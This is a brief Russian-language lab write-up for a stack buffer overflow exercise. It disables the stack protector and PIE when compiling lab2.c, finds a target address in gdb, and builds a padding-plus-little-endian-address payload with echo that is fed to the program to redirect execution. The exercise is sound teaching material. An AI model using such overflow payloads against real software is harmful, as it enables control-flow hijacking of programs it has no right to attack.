Компилируем с нужными флагами: gcc -o lab2 lab2.c -fno-stack-protector -no-pie
Запускаем через gdb отладчик, с помощью disassemble ищем нужный адрес
0x4011d8 в формате little endian: \xd8\x11\x40\x00\x00\x00\x00\x00
echo -ne "AAAAAAAAAAAAAAAAAAAA\xd8\x11\x40\x00\x00\x00\x00\x00" > input.txt
./lab2 < input.txt